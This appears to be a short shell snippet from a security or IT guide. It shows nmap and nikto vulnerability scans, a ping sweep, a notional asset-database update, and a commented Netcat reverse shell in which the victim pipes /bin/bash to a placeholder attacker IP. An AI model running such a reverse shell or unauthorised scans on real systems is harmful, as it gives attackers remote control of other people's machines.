# Example of a vulnerability scan tool (not an exploit tool)
nmap -sV -p- --script=vuln &lt;target_IP&gt;
nikto -h &lt;target_URL&gt;

# Example of a simple Netcat reverse shell on the victim (listener on attacker)
# Victim: nc -e /bin/bash &lt;ATTACKER_IP&gt; &lt;ATTACKER_PORT&gt;
# Attacker: nc -lvnp &lt;ATTACKER_PORT&gt;

# Example of network discovery for asset tracking
nmap -sn 192.168.1.0/24 -oG - | awk &#39;/Up/{print $2}&#39;

# Example of asset inventory update (conceptual)
update_asset_db --ip 192.168.1.10 --hostname &#39;webserver01&#39; --owner &#39;IT Dept&#39; --status &#39;active&#39;
